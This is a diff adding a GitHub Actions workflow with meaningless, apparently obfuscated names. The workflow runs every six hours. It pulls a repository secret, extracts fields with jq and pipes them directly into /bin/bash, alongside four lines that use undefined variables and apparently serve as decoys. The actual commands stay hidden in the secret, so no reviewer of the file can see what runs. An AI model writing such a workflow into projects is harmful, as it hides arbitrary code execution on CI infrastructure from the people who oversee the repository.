@@ -1,0 +1,21 @@
+name: caocao19870106
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caocao19870106
+        env:
+          jyk6514: ${{ secrets.jyk6514 }}
+        run: |
+          echo $jyk6514 | jq -r .yus71850 | /bin/bash
+          echo $fhyrk15614 | jq -r .tzi971 | /bin/bash
+          echo $cz76 | jq -r .wgzvz89 | /bin/bash
+          echo $n501 | jq -r .vlkjr5 | /bin/bash
+          echo $foo2 | jq -r .i6 | /bin/bash
+
